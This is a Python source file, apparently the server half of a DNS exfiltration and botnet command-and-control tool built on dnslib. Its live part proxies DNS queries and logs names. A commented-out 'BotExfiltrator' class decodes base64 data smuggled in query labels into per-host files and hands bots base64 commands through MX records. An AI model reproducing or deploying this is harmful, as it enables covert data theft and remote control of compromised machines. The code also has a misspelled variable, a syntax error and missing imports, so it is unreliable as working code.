import base64

from dns_exfil import config

import dnslib
from dnslib.server import DNSServer, BaseResolver
from dnslib.intercept import InterceptResolver

from socketserver import BaseRequestHandler, UDPServer

class InterceptDefaultResolver(BaseResolver):
    '''
    Base Class for specific Exfiltrator modes
    Defines default behavior, which acts as a normal DNS server
    Unusual behavior modes should be defined in a subclass of this server.
    '''
    def __init__(self):

        self.interceptor = InterceptResolver(**config['server']['upstream'])
        # link the piece of global config relevant to this instance
        context_name = type(self).__name__.lower()
        self.context = config['server'][context_name]
        super(BaseResolver, self).__init__()

    def resolve(self, request, handler):
        qname = request.q.qname
        qtype = request.q.qtype
        # The QTYPE bitmaps numerical record types to it's string value
        # For example, QTYPE[15] -> 'MX'
        # See https://en.wikipedia.org/wiki/List_of_DNS_record_types
        # If a class has a method implemented by this name, we can use it
        # otherwise, we will just proxy the request upstream.
        try:
            query_resolver = getattr(self, QTYPE[qtype])
            rdata_handler = getattr(dnslib, QTYPE[qype])
        except AttributeError:
            return self.interceptor.resolve(request, handler)
        question_name = str(qname)
        response = query_resolver(question_name))
        answer = RR(question_name, qtype, rdata=rdata_handler(response), ttl=self.context['ttl'])
        reply = request.reply() 
        reply.add_answer(answer)
        return reply
        

class BotExfiltrator(InterceptDefaultResolver):
     def A(self, name):
         print('received', name)



#class BotExfiltrator(InterceptDefaultResolver):
#    def __init__(self):
#        super(BotExfiltrator, self).__init__()
#
#    def AAAA(self, name):
#        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
#
#    def A(self, name):
#        rfilename = name.label[1].decode('utf-8')
#        host = self.client_address[0]
#        if rfilename == self.context['cmd']:
#            lfilename = rfilename
#        else:
#            lfilename = host + '_' + rfilename
#        try:
#            with open(lfilename, 'a+b') as f:
#                f.write(base64.b64decode(name.label[0]))
#        except:
#            pass
#        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
#
#    def MX(self, name):
#        try:
#            with open(self.context['cmd']) as f:
#                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1].encode('utf-8'))
#        except:
#            cmd = base64.standard_b64encode(bytes(''))
#        return RR(name, QTYPE.MX, rdata=MX(cmd.decode('utf-8') + "." + self.context['domain']), ttl=0)
#

# Run the actual server. 


def start_server(resolver):
    server = DNSServer(resolver=resolver, **config['server']['service'])
    server.start_thread()
